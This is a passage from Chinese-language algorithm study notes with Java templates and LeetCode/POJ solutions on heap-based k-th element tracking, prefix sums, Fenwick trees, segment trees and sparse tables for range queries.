}\n\n  public void change(int index, int number) {\n    Integer preNum = IndexToNumber.get(index);\n    IndexToNumber.put(index, number);\n    if (preNum != null) {\n      numberToIndex.get(preNum).remove(index);\n    }\n    numberToIndex.computeIfAbsent(number, p -> new TreeSet<>()).add(index);\n  }\n\n  public int find(int number) {\n    TreeSet<Integer> integers = numberToIndex.get(number);\n    if (integers == null || integers.size() == 0) return -1;\n    return integers.first();\n  }\n}\n```\n换成TreeSet后，没有出现超时的情况，提交成功\n\n### 动态排行问题 (Heap和BST的应用)\n#### K是固定值时\n##### 实现方式一: 大根堆加小根堆\n维护一个最大(映射)堆A和一个最小(映射)堆B，A里面维护当前数据集合的前K大的元素，B里面维护其他的元素，那么A的根就是当前集合里的第k大元素。\n\n此算法的复杂度为O(nlogk);\n\n##### 模版\n```java\nclass FindKthByHeap {\n  private int[] nums;\n  // 所要找的第几大的元素\n  int k;\n\n  /**\n   * 创建大根堆与小根堆。\n   * 堆存储堆是元素的id。即nums的下标\n   */\n  Comparator<Integer> comparator = (a, b) -> nums[a] != nums[b] ? Integer.compare(nums[a], nums[b]) : a - b;\n  TreeSet<Integer> maxHeap = new TreeSet<>(comparator.reversed());\n  TreeSet<Integer> minHeap = new TreeSet<>(comparator);\n\n  public FindKthByHeap(int[] nums, int k) {\n    this.nums = nums;\n    this.k = k;\n  }\n\n  /**\n   * 往堆中添加元素\n   */\n  public void add(int itemId) {\n    minHeap.add(itemId);\n    maxHeap.add(minHeap.pollFirst());\n    balance();\n  }\n\n  /**\n   * 通过给定的元素id删除堆中对应的元素\n   *\n   * @param itemId 元素的id\n   */\n  public void remove(int itemId) {\n    if (!maxHeap.remove(itemId)) {\n      minHeap.remove(itemId);\n    }\n  }\n\n  /**\n   * @return 第k大元素的id\n   */\n  public int getKthItemId() {\n    return maxHeap.first();\n  }\n\n  /**\n   * @return 第k大元素\n   */\n  public int getKthItem() {\n    return nums[maxHeap.first()];\n  }\n\n\n  /**\n   * @return 第k+1大元素的id\n   */\n  public int getK1thItemId() {\n    return minHeap.first();\n  }\n\n  /**\n   * @return 第k+1大元素\n   */\n  public int getK1thItem() {\n    return nums[minHeap.first()];\n  }\n\n  /**\n   * 维持大根堆元素个数小于等于k\n   */\n  private void balance() {\n    while (maxHeap.size() > k) {\n      minHeap.add(maxHeap.pollFirst());\n    }\n  }\n\n  }\n```\n注意的比较器不能写成下面形式： \n```java\nComparator<Integer> comparator = (a, b) -> Integer.compare(nums[a], nums[b]);\n```\n之所以不写成上述形式的原因是因为TreeSet存的是元素的id。如果a与b分别是2个不同的元素的id的话，那么a与b是不会相同的。 但是按照上述比较器的话，a与b是会相同的。例如当a=1, b=2,且num[1]等于num[2]时，如果按照上述比较器的话，`Integer.compare(nums[a], nums[b])`返回0，表示a等于b，由于TreeSet中是无重复元素的, 所以TreeSet中不会同时出现a与b。而这显然与需求不符合。所以比较器应该写成如下形式： \n```java\nComparator<Integer> comparator = (a, b) -> nums[a] != nums[b] ? Integer.compare(nums[a], nums[b]) : a - b;\n```\n\n###### 例题1: 滑动窗口中位数\n[滑动窗口中位数](https://leetcode.cn/problems/sliding-window-median/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220603194139.png)\n\n代码：\n```java\nclass Solution {\n  public double[] medianSlidingWindow(int[] nums, int k) {\n    FindKthByHeap findKthByHeap = new FindKthByHeap(nums, (int)Math.ceil(k / 2.0));\n    double[] res = new double[nums.length - k + 1];\n    for (int i = 0; i < k; i++) {\n      findKthByHeap.add(i);\n    }\n    if (k % 2 == 0) {\n      res[0] = ((double) findKthByHeap.getKthItem() + findKthByHeap.getK1thItem()) / 2.0;\n    } else {\n      res[0] = (double) findKthByHeap.getKthItem();\n    }\n    \n    int j = 1;\n    for (int i = k; i < nums.length; i++) {\n      findKthByHeap.remove(i - k);\n      findKthByHeap.add(i);\n      if (k % 2 == 0) {\n        res[j++] = ((double) findKthByHeap.getKthItem() + findKthByHeap.getK1thItem()) / 2.0;\n      } else {\n        res[j++] = (double) findKthByHeap.getKthItem();\n      }\n    }\n    return res;\n  }\n\n\n  class FindKthByHeap {\n    private int[] nums;\n    // 所要找的第几大的元素\n    int k;\n\n    /**\n      * 创建大根堆与小根堆。\n      * 堆存储堆是元素的id。即nums的下标\n      */\n    Comparator<Integer> comparator = (a, b) -> nums[a] != nums[b] ? Integer.compare(nums[a], nums[b]) : a - b;\n    TreeSet<Integer> maxHeap = new TreeSet<>(comparator.reversed());\n    TreeSet<Integer> minHeap = new TreeSet<>(comparator);\n\n    public FindKthByHeap(int[] nums, int k) {\n      this.nums = nums;\n      this.k = k;\n    }\n\n    public void add(int itemId) {\n      minHeap.add(itemId);\n      maxHeap.add(minHeap.pollFirst());\n      balance();\n    }\n\n    /**\n      * @return 第k大元素的id\n      */\n    public int getKthItemId() {\n      return maxHeap.first();\n    }\n\n    /**\n      * @return 第k大元素\n      */\n    public int getKthItem() {\n      return nums[maxHeap.first()];\n    }\n\n\n    /**\n      * @return 第k+1大元素的id\n      */\n    public int getK1thItemId() {\n      return minHeap.first();\n    }\n\n    /**\n      * @return 第k+1大元素\n      */\n    public int getK1thItem() {\n      return nums[minHeap.first()];\n    }\n\n    /**\n      * 通过给定的元素id删除堆中对应的元素\n      *\n      * @param itemId 元素的id\n      */\n    public void remove(int itemId) {\n      if (!maxHeap.remove(itemId)) {\n        minHeap.remove(itemId);\n      }\n    }\n\n    /**\n      * 维持大根堆元素个数小于等于k\n      */\n    private void balance() {\n      while (maxHeap.size() > k) {\n        minHeap.add(maxHeap.pollFirst());\n      }\n    }\n\n  }\n\n} \n```\n\n###### 例题2: 找出数组中的第 K 大整数\n[找出数组中的第 K 大整数](https://leetcode.cn/problems/find-the-kth-largest-integer-in-the-array/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220603231915.png)\n\n注意：这里的第K大正数的定义有点不同\n\n```java\nclass Solution {\n  public String kthLargestNumber(String[] nums, int k) {\n    FindKthByHead findKthByHead = new FindKthByHead(k, nums);\n    for (int i = 0; i < nums.length; i++) {\n      findKthByHead.add(i);\n    }\n    return findKthByHead.getKthItem();\n  }\n\n  class FindKthByHead {\n    String[] nums;\n    int k; \n\n    Comparator<Integer> comparator = (a, b) -> {\n\n      // 注意：nums[a]等于nums[b]时不能返回0\n      if (nums[a].equals(nums[b])) {\n        return a - b;\n      }\n\n      if (nums[a].length() < nums[b].length()) {\n        return -1;\n      }\n      if (nums[a].length() > nums[b].length()) {\n        return 1;\n      }\n      return nums[a].compareTo(nums[b]);\n    };\n    TreeSet<Integer> maxHeap = new TreeSet<>(comparator.reversed());\n    TreeSet<Integer> minHeap = new TreeSet<>(comparator); \n\n    public FindKthByHead(int k, String[] nums) {\n      this.k = k;\n      this.nums = nums;\n    } \n\n    public void add(int itemId) {\n      maxHeap.add(itemId);\n      minHeap.add(maxHeap.pollFirst());\n      balance();\n    }\n    \n    public String getKthItem() {\n      return nums[minHeap.first()];\n    }\n\n    private void balance() {\n      while (minHeap.size() > k) {\n        maxHeap.add(minHeap.pollFirst());\n      }\n    }\n  }\n}\n```\n\n## 区间和\n\n### 静态数据区间和\n\n#### 前缀和\n前缀和的思路是这样的，对于一个给定的数组 nums，我们额外开辟一个前缀和数组进行预处理：\n```java\nint n = nums.length;\n// 前缀和数组\nint[] preSum = new int[n + 1];\npreSum[0] = nums[0];\nfor (int i = 1; i < n; i++) {\n  preSum[i] = preSum[i - 1] + nums[i];\n}\n```\n\n##### 例题1: 转角路径的乘积中最多能有几个尾随零\n[转角路径的乘积中最多能有几个尾随零](https://leetcode.cn/problems/maximum-trailing-zeros-in-a-cornered-path/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220609164612.png)\n\n###### 分析\n因子分解：尾数0的个数由乘积因子中10的个数所决定，而10又由`2*5`组成。\n- 两个2和两个5可组成两个10：`2 * 5 * 2 * 5 = 100`\n- 三个2和两个5可组成两个10：`2 * 5 * 2 * 5 * 2 = 200`\n\n可发现，对于一个整数num而言，其质因子中2和5的数目的较小值即为尾数0的数目。\n\n因此，一条路径的乘积中尾数0的个数，即为该条路径中各个乘数所包含的因子2的个数和与因子5的个数和的较小者。\n\n因此先用前缀和维护每一行和每一列因子2与因子5的数量，再枚举拐点计算答案即可。\n\n代码：\n```java\nclass Solution {\n  \n    static int[][] c25 = new int[1001][2];\n    static {\n        // 预处理：递推算出每个数的因子 2 的个数和因子 5 的个数\n        for (int i = 2; i <= 1000; i++) {\n            if (i % 2 == 0) c25[i][0] = c25[i / 2][0] + 1;\n            if (i % 5 == 0) c25[i][1] = c25[i / 5][1] + 1;\n        }\n    }\n\n    public int maxTrailingZeros(int[][] grid) {\n      // 不同行的前缀和\n      // rowPreSum[i][j][0]的第i行中前j列中能被2整除的个数\n      // rowPreSum[i][j][1]的第i行中前j列中能被5整除的个数\n      int[][][] rowPreSum = new int[grid.length][grid[0].length][2];\n      // 不同列的前缀和\n      // colPreSum[i][j][0]的第i列中前j行中能被2整除的个数\n      // colPreSum[i][j][1]的第i列中前j行中能被5整除的个数\n      int[][][] colPreSum = new int[grid[0].length][grid.length][2];\n      \n      for (int r = 0; r < grid.length; r++) {\n        rowPreSum[r][0][0] = c25[grid[r][0]][0];\n        rowPreSum[r][0][1] = c25[grid[r][0]][1];\n        for (int c = 1; c < grid[0].length; c++) {\n          rowPreSum[r][c][0] = rowPreSum[r][c - 1][0] + c25[grid[r][c]][0];\n          rowPreSum[r][c][1] = rowPreSum[r][c - 1][1] + c25[grid[r][c]][1];\n        }\n      }\n      \n      for (int c = 0; c < grid[0].length; c++) {\n        colPreSum[c][0][0] = c25[grid[0][c]][0];\n        colPreSum[c][0][1] = c25[grid[0][c]][1];\n        for (int r = 1; r < grid.length; r++) {\n          colPreSum[c][r][0] = colPreSum[c][r - 1][0] + c25[grid[r][c]][0];\n          colPreSum[c][r][1] = colPreSum[c][r - 1][1] + c25[grid[r][c]][1];\n        }\n      }\n      \n      int res = Integer.MIN_VALUE;\n      for (int r = 0; r < grid.length; r++) {\n        for (int c = 0; c < grid[0].length; c++) {\n          \n          int tempRowLeftFor2 = rowPreSum[r][c][0];\n          int tempRowRightFor2 = rowPreSum[r][grid[0].length -1][0] - rowPreSum[r][c][0] + c25[grid[r][c]][0];\n          int tempColUpFor2 = colPreSum[c][r][0];\n          int tempColDownFor2 = colPreSum[c][grid.length - 1][0] - colPreSum[c][r][0] + c25[grid[r][c]][0];\n          \n          int tempRowLeftFor5 = rowPreSum[r][c][1];\n          int tempRowRightFor5 = rowPreSum[r][grid[0].length -1][1] - rowPreSum[r][c][1] + c25[grid[r][c]][1];\n          int tempColUpFor5 = colPreSum[c][r][1];\n          int tempColDownFor5 = colPreSum[c][grid.length - 1][1] - colPreSum[c][r][1] + c25[grid[r][c]][1];\n          \n          int leftUpFor2 = tempRowLeftFor2 + tempColUpFor2 - c25[grid[r][c]][0];\n          int leftUpFor5 = tempRowLeftFor5 + tempColUpFor5 - c25[grid[r][c]][1];\n          int leftUp = Math.min(leftUpFor2, leftUpFor5);\n          \n          res = Math.max(res, leftUp);\n          \n          int leftDownFor2 = tempRowLeftFor2 + tempColDownFor2 - c25[grid[r][c]][0];\n          int leftDownFor5 = tempRowLeftFor5 + tempColDownFor5 - c25[grid[r][c]][1];\n          int leftDown = Math.min(leftDownFor2, leftDownFor5);\n          res = Math.max(res, leftDown);\n          \n          int rightUpFor2 = tempRowRightFor2 + tempColUpFor2 - c25[grid[r][c]][0];\n          int rightUpFor5 = tempRowRightFor5 + tempColUpFor5 -c25[grid[r][c]][1]; \n          int rightUp = Math.min(rightUpFor2, rightUpFor5);\n          res = Math.max(res, rightUp);\n          \n          int rightDownFor2 = tempRowRightFor2 + tempColDownFor2 - c25[grid[r][c]][0];\n          int rightDownFor5 = tempRowRightFor5 + tempColDownFor5 - c25[grid[r][c]][1];\n          int rightDown = Math.min(rightDownFor2, rightDownFor5);\n          res = Math.max(res, rightDown);\n           \n        }\n      }\n      return res;  \n    }\n\n}\n```\n\n##### 例题2：选择建筑的方案数\n[选择建筑的方案数](https://leetcode.cn/problems/number-of-ways-to-select-buildings/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220611112135.png)\n\n###### 分析\n参考：https://leetcode.cn/problems/number-of-ways-to-select-buildings/solution/by-baoya_uncle-qsr8/\n\n对任意一个位置，以它为中心构建合法相邻建筑的数量，分两种情况讨论：\n- 该位置左侧1的数量`*`该位置右侧1的数量 （若该位置为0 ）。这样可以构成101。\n- 该位置左侧0的数量`*`该位置右侧0的数量 （若该位置为1 ）。这样可以构成010。\n两种情况分别举个例子：\n\n例子一：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220611112325.png)\n\n例子二：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220611112338.png)\n\n算法部分，\n1. 从左往右遍历一次，统计每个位置左侧0或者1的数量。 统计0还是1取决于该位置是1还是0。\n2. 再从右往左遍历一次，统计每个位置右侧侧0或者1的数量 。\n3. 同一位置，左侧0或1侧数量，和右侧0或1侧数量相乘，即为以该位置贡献的答案数量，对每个位置的贡献量求和，即为返回答案。\n\n代码：\n```java\nclass Solution {\n  public long numberOfWays(String s) {\n    char[] charArray = s.toCharArray();\n    int n = charArray.length;\n    long[] preSumFor1 = new long[n];\n    long[] preSumFor0 = new long[n];\n    preSumFor1[0] = (charArray[0] == '1') ? 1 : 0;\n    preSumFor0[0] = (charArray[0] == '0') ? 1 : 0;\n    for (int i = 1; i < n; i++) {\n      if (charArray[i] == '1') {\n        preSumFor1[i] = preSumFor1[i - 1] + 1;\n        preSumFor0[i] = preSumFor0[i - 1];\n      } else {\n        preSumFor0[i] = preSumFor0[i - 1] + 1;\n        preSumFor1[i] = preSumFor1[i - 1];\n      }\n    }\n    long res = 0;\n    for (int i = 1; i < n - 1; i++) {\n      if (charArray[i] == '0') {\n        res += preSumFor1[i - 1] * (preSumFor1[n - 1] - preSumFor1[i]);\n      } else {\n        res += preSumFor0[i - 1] * (preSumFor0[n - 1] - preSumFor0[i]);\n      }\n    }\n    return res;\n  }\n}\n```\n\n##### 例题3: 字符串中最多数目的子字符串\n[字符串中最多数目的子字符串](https://leetcode.cn/problems/maximize-number-of-subsequences-in-a-string/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220611120412.png)\n\n###### 分析\n最优的情况下，肯定是 pattern[0] 插入到 text 开头或 pattern[1] 插入到 text 结尾。分别统计一下哪个子序列最多。\n\n使用前缀和来统计text中pattern[0]出现的次数\n\n代码： \n```java\nclass Solution {\n  public long maximumSubsequenceCount(String text, String pattern) {\n    \n    String textTemp = pattern.charAt(0) + text;\n    char[] charArray = textTemp.toCharArray();\n    int[] preSum1 = new int[textTemp.length()];\n    preSum1[0] = 1;\n    for (int i = 1; i < charArray.length; i++) {\n      preSum1[i] = preSum1[i - 1] + (charArray[i] == charArray[0] ? 1 : 0);\n    }\n    long res = 0;\n    for (int i = 1; i < charArray.length; i++) {\n      if (charArray[i] == pattern.charAt(1)) {\n        res += preSum1[i - 1];\n      }\n    }\n\n    String textTemp1 = text + pattern.charAt(1);\n    char[] charArray1 = textTemp1.toCharArray();\n    int[] preSum2 = new int[textTemp1.length()];\n    preSum2[0] = (charArray1[0] == pattern.charAt(0)) ? 1 : 0;\n    for (int i = 1; i < charArray1.length; i++) {\n      preSum2[i] = preSum2[i - 1] + (charArray1[i] == pattern.charAt(0) ? 1 : 0);\n    }\n    long res2 = 0;\n    for (int i = 1; i < charArray1.length; i++) {\n      if (charArray1[i] == pattern.charAt(1)) {\n        res2 += preSum2[i - 1];\n      }\n    }\n    return Math.max(res, res2);\n  }\n}\n```\n\n### 动态数据区间和\n#### 树状数组\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1M7R5H2gUKRU9D_290V7CJJfQ-zbvc8ZO/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n**数组树状不能用来求区间最值问题，求区间最值问题用线段树或ST表**\n\n##### 模版\n```java\nclass BIT {\n  int[] a, c;\n\n  public BIT(int[] nums) {\n    int n = nums.length;\n    a = new int[n];\n    c = new int[n + 1];\n    for (int i = 0; i < n; i++) update(i, nums[i]);\n  }\n\n  // 更新a[i]为val\n  public void update(int i, int val) {\n    int diff = val - a[i];\n    a[i] = val;\n    for (i++; i < c.length; i += (i & -i)) {\n      c[i] += diff;\n    }\n  }\n\n  // 求a[0...i]之和\n  public int preSum(int i) {\n    int sum = 0;\n    for (i++; i > 0; i -= (i & -i)) sum += c[i];\n    return sum;\n  }\n}\n```\n注意：update以及preSum方法中的for循环中必须要写`i++`的原因是c数组下标必须要是1开始的。上述模版中a数组与c数组的关系如下\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/Screen%20Shot%202022-07-21%20at%2021.08.18.jpg)\n\n\n#### 线段树\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/p2ofSLrK9HM\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1mA9vfd8xsiVjDFoYk_Il6Jm3Z9Y-XORD/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n##### zkw线段树\n###### 模版\n模版：\n```java\nclass SegmentTree {\n  int n;\n  int[] st;\n\n  public SegmentTree(int[] nums) {\n    n = nums.length;\n    st = new int[2 * n];\n    for (int i = n; i < n * 2; i++) st[i] = nums[i - n];\n    for (int i = n - 1; i > 0; i--) st[i] = st[2 * i] + st[2 * i + 1];\n  }\n\n  // 将nums[i]更新为val\n  void update(int i, int val) {\n    int diff = val - st[i + n];\n    for (i += n; i > 0; i /= 2) st[i] += diff;\n  }\n\n  // 求nums[i..j]之和\n  int sumRange(int i, int j) {\n    int res = 0;\n    for (i += n, j += n; i <= j; i /= 2, j /= 2) {\n      // s[i]是右子节点\n      if (i % 2 == 1) res += st[i++];\n      // s[j]是左子节点\n      if (j % 2 == 0) res += st[j--];\n    }\n    return res;\n  }\n}\n```\n\n**示例1:**以nums=[4, 6, 7, 3]为例。\n\n1. `new SegmentTree(nums)`后，st内容如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721145844.png)\n\n我们可以发现所有叶子节点存储的是nums中的元素\n\n2. 调用`update(2, 5)`时，具体操作如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721150329.png)\n\n3. 调用`sumRange(1, 3)`时，具体操作如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721150813.png)\n\n**示例2:** 以nums=[2, 4, 1, 5, 8]为例。\n\n1. `new SegmentTree(nums)`后，st内容如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721151700.png)\n\n2. 调用`update(2, 5)`时，具体操作如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721151840.png)\n\n3. 调用`sumRange(1, 3)`时，具体操作如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721152311.png)\n\n##### 基于tree的线段树\n###### 模版\n```java\nclass Node {\n  int start, end, sum;\n  Node left, right;\n\n  Node(int start, int end) {\n    this.start = start;\n    this.end = end;\n  }\n}\n\nclass SegmentTree {\n  int[] nums;\n  Node root;\n\n  public SegmentTree(int[] nums) {\n    this.nums = nums;\n    this.root = buildTree(nums, 0, nums.length - 1);\n  }\n\n  private Node buildTree(int[] nums, int start, int end) {\n    if (start > end) return null;\n    Node node = new Node(start, end);\n    if (start == end) {\n      node.sum = nums[start];\n    } else {\n      int mid = start + (end - start) / 2;\n      node.left = buildTree(nums, start, mid);\n      node.right = buildTree(nums, mid + 1, end);\n      node.sum = node.left.sum + node.right.sum;\n    }\n    return node;\n  }\n\n  // 更新nums[i]为val\n  public void update(Node node, int i, int val) {\n    if (node.start == node.end) {\n      node.sum = val;\n      return;\n    }\n    int mid = node.start + (node.end - node.start) / 2;\n    if (i <= mid) update(node.left, i, val);\n    else if (i > mid) update(node.right, i, val);\n    node.sum = node.left.sum + node.right.sum;\n  }\n\n  // 求nums[start...end]之和\n  public int sumRange(Node node, int start, int end) {\n    if (start > end) return 0;\n    if (node.start == start && node.end == end) return node.sum;\n    int mid = node.start + (node.end - node.start) / 2;\n    if (end <= mid) return sumRange(node.left, start, end);\n    else if (start > mid) return sumRange(node.right, start, end);\n    else return sumRange(node.left, start, mid) + sumRange(node.right, mid + 1, end);\n  }\n\n}\n```\n\n#### 例题1: 计算右侧小于当前元素的个数\n[计算右侧小于当前元素的个数](https://leetcode.cn/problems/count-of-smaller-numbers-after-self/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220722093645.png)\n\n##### 分析\n\n参考链接：https://leetcode.cn/problems/count-of-smaller-numbers-after-self/solution/ji-suan-you-ce-xiao-yu-dang-qian-yuan-su-de-ge-s-7/\n\n记题目给定的序列为a，我们规定 $a_i$的取值集合为a的「值域」。我们用桶来表示值域中的每一个数，桶中记录这些数字出现的次数。假设a={5,5,2,3,6}，那么遍历这个序列得到的桶是这样的：\n```txt\nindex  ->  1 2 3 4 5 6 7 8 9\nvalue  ->  0 1 1 0 2 1 0 0 0\n```\n\n转化为动态维护前缀和问题: 记 value 序列为 v，我们可以看出它第i−1 位的前缀和表示「有多少个数比 i 小」。那么我们可以从后往前遍历序列 a，记当前遍历到的元素为 $a_i$，我们把 $a_i$对应的桶的值自增1，记 $a_i$ = p，把 v 序列p−1位置的前缀和加入到答案中算贡献。为什么这么做是对的呢，因为我们在循环的过程中，我们把原序列分成了两部分，后半部部分已经遍历过（已入桶），前半部分是待遍历的（未入桶），那么我们求到的p−1 位置的前缀和就是「已入桶」的元素中比p小的元素的个数总和。这种动态维护前缀和的问题我们可以用「树状数组」来解决。\n\n代码：\n```java\nclass Solution {\n  public List<Integer> countSmaller(int[] nums) {\n    BIT bit = new BIT(20001);\n    List<Integer> res = new ArrayList();\n    for (int i = nums.length - 1; i >= 0; i--) {\n      int temp = nums[i] + 10000;\n      bit.update(temp, bit.a[temp] + 1);\n      res.add(bit.preSum(temp - 1));\n    }\n    Collections.reverse(res);\n    return res;\n  }\n}\n\nclass BIT {\n  int[] a, c;\n  \n  public BIT(int n) {\n    a = new int[n];\n    c = new int[n + 1];\n  }\n\n  public void update(int i, int val) {\n    int diff = val - a[i];\n    a[i] = val;\n    for (i++; i < c.length; i += (i & -i)) c[i] += diff;\n  }\n\n  public int preSum(int i) {\n    int sum = 0;\n    for (i++; i > 0; i-= (i & -i)) sum += c[i];\n    return sum;\n  }\n\n}\n```\n\n#### 例题2: 通过指令创建有序数组\n[通过指令创建有序数组](https://leetcode.cn/problems/create-sorted-array-through-instructions/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220722100901.png)\n\n这题与例题`计算右侧小于当前元素的个数`的思考方式一样\n\n代码：\n```java\nclass Solution {\n  public int createSortedArray(int[] instructions) {\n    BIT bit = new BIT(100001);\n    int res = 0;\n    for (int i = 0; i < instructions.length; i++) {\n      res = (res + Math.min(bit.preSum(instructions[i] - 1), bit.preSum(100000) - bit.preSum(instructions[i])) % (int)(1e9+7)) % (int)(1e9+7);\n      bit.update(instructions[i], bit.a[instructions[i]] + 1); \n    }\n    return res;\n  }\n}\n\nclass BIT {\n  int[] a, c;\n  \n  public BIT(int n) {\n    a = new int[n];\n    c = new int[n + 1];\n  }\n\n  public void update(int i, int val) {\n    int diff = val - a[i];\n    a[i] = val;\n    for (i++; i < c.length; i += (i & -i)) c[i] += diff;\n  }\n\n  public int preSum(int i) {\n    int sum = 0;\n    for (i++; i > 0; i -= (i & -i)) sum += c[i];\n    return sum;\n  }\n\n}\n```\n\n#### 例题3: 数字流的秩\n[数字流的秩](https://leetcode.cn/problems/rank-from-stream-lcci/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220722111819.png)\n\n代码：\n```java\nclass StreamRank {\n\n  BIT bit;\n  public StreamRank() {\n    bit = new BIT(50001);\n  }\n  \n  public void track(int x) {\n    bit.update(x, 1);\n  }\n  \n  public int getRankOfNumber(int x) {\n    return bit.preSum(x);\n  }\n}\n\nclass BIT {\n  int[] a, c;\n\n  public BIT(int n) {\n    a = new int[n];\n    c = new int[n + 1];\n  }\n\n  public void update(int i, int val) {\n    int diff = val - a[i];\n    a[i] = val;\n    for (i++; i < c.length; i += (i & -i)) c[i] += val;\n  }\n  \n  public int preSum(int i) {\n    int sum = 0;\n    for (i++; i > 0; i -= (i & -i)) sum += c[i];\n    return sum;\n  }\n}\n```\n\n\n## RMQ\n### 倍增、ST表\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1JCC9ncNlTOYHGz0hnxigX5btGzXpRz1-/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/aqQToXiQ7S4\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n#### 一维ST表\n##### 模版\n```java\nclass ST {\n  // F[i][j]: 表示[i, i+2^j-1]区间的最值\n  int[][] F;\n\n  public ST(int[] nums) {\n    int n = nums.length;\n    int k = (int) (Math.log(n) / Math.log(2));\n    // 初始化F数组\n    F = new int[n][k + 1];\n    for (int i = 0; i < n; i++) {\n      F[i][0] = nums[i];\n    }\n    for (int j = 1; j <= k; j++) {\n      for (int i = 0; i < n - (1 << j) + 1; i++) {\n        F[i][j] = Math.max(F[i][j - 1], F[i + (1 << (j - 1))][j - 1]);\n      }\n    }\n  }\n\n  // 求区间[l..r]的最值\n  int query(int l, int r) {\n    if (l > r) {\n      // TODO\n    }\n    int k = (int) (Math.log(r - l + 1) / Math.log(2));\n    return Math.max(F[l][k], F[r - (1 << k) + 1][k]);\n  }\n\n}\n```\n\n##### 例题1: 平衡的阵容\n[平衡的阵容](http://poj.org/problem?id=3264)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220604142745.png)\n\n```java\nint N = cin.nextInt();\nint Q = cin.nextInt();\nint[] nums = new int[N];\n\npublic void solve() {\n  read(nums);\n  ST st = new ST(nums);\n  while (Q-- != 0) {\n    int l = cin.nextInt();\n    int r = cin.nextInt();\n    System.out.println(st.query(l - 1, r - 1));\n  }\n}\n\nclass ST {\n  // F[i][j][0]: 表示[i, i+2^j-1]区间的最大值\n  // F[i][j][1]: 表示[i, i+2^j-1]区间的最小值\n  int[][][] F;\n\n  public ST(int[] nums) {\n    int n = nums.length;\n    int k = (int) (Math.log(n) / Math.log(2));\n    // 初始化F数组\n    F = new int[n][k + 1][2];\n    for (int i = 0; i < n; i++) {\n      F[i][0] = new int[]{nums[i], nums[i]};\n    }\n    for (int j = 1; j <= k; j++) {\n      for (int i = 0; i < n - (1 << j) + 1; i++) {\n        F[i][j][0] = Math.max(F[i][j - 1][0], F[i + (1 << (j - 1))][j - 1][0]);\n        F[i][j][1] = Math.min(F[i][j - 1][1], F[i + (1 << (j - 1))][j - 1][1]);\n      }\n    }\n  }\n\n  // 求区间[l..r]的最值\n  int query(int l, int r) {\n    int k = (int) (Math.log(r - l + 1) / Math.log(2));\n    return Math.max(F[l][k][0], F[r - (1 << k) + 1][k][0]) - Math.min(F[l][k][1], F[r - (1 << k) + 1][k][1]);\n  }\n\n}\n```\n\n##### 例题2: 频繁值\n[频繁值](http://poj.org/problem?id=3368)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220604155952.png)\n\n###### 分析\n因为是非降序的，所以可以从头遍历把每个相同的数字化为一个块，用`p[i]`表示第i个元素划分到哪个块里面，同时用`r[j]`和`l[j]`记第j个块的左右边界。同时freq数组用来记录每个块中数字个数，可以把freq数组处理成一个ST表\n\n对于每个给定的查询区间，如果区间完全包含于某个块内，那么说明区间内所有数字相同，答案就是区间的长度。否则，该查询区间可以分为如下三个部分：\n1. 最左侧`[i, r[p[i]]]`区间的一个块的部分\n2. 最右侧`[l[p[j]], j]`区间的一个块的部分\n3. 中间的`[r[p[i]] + 1, l[p[j]] - 1]`区间的某干个块\n其中第1、2部分中重复的数字分别就是它们的区间长度。而第3部分可以通过ST表来求得。答案就是这三者取最大值\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220604162101.png)\n\n代码： \n```java\npublic void solve() {\n  while (true) {\n    int n = cin.nextInt();\n    if (n == 0) return;\n    int q = cin.nextInt();\n    int[] nums = new int[n];\n    read(nums);\n    int[] freq = new int[n];\n    int[] p = new int[n]; // p[i]: 表示第i个元素位于哪个块\n    int[] r = new int[n]; // r[i]: 表示第i块的右下标\n    int[] l = new int[n]; // l[i]: 表示第i块的左下标\n    int pId = 0; // 块编号\n    int cnt = 0; // 当前块内的元素个数\n    int nowP = nums[0]; // 当前块内的元素\n    l[0] = 0;\n    for (int i = 0; i < n; i++) {\n      if (nums[i] != nowP) {\n        r[pId] = i - 1;\n        pId++;\n        cnt = 0;\n        nowP = nums[i];\n        l[pId] = i;\n      }\n      cnt++;\n      freq[i] = cnt;\n      p[i] = pId;\n    }\n    r[pId] = n - 1;\n\n    ST st = new ST(freq);\n\n    while (q-- != 0) {\n      int i = cin.nextInt();\n      int j = cin.nextInt();\n      i--;\n      j--;\n\n      // [i, j]在同一个块内时\n      if (p[i] == p[j]) {\n        System.out.println(j - i + 1);\n      } else {\n        // [i, j]不在同一个块内时\n        int temp1 = r[p[i]] - i + 1;\n        int temp2 = j - l[p[j]] + 1;\n        int temp3 = st.query(r[p[i]] + 1, l[p[j]] - 1);\n        System.out.println(Math.max((Math.max(temp1, 